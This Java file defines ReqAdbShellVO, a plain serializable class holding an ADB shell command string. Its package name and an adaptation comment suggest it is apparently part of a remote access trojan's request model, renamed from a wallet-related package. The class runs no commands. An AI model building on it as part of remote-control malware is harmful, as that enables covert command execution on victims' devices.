package com.vendor.rat.model.req;
// ADAPT: package com.guard.wallet.req -> com.vendor.rat.model.req
import androidx.annotation.NonNull;
import java.io.Serializable;
public class ReqAdbShellVO implements Serializable {
    private String command;
    public ReqAdbShellVO() {
    }
    public ReqAdbShellVO(String str) {
        this.command = str;
    }
    public String getCommand() {
        return this.command;
    }
    public void setCommand(String str) {
        this.command = str;
    }
    @NonNull
    public String toString() {
        return "ReqAdbShellVO{command='" + this.command + "'}";
    }
}
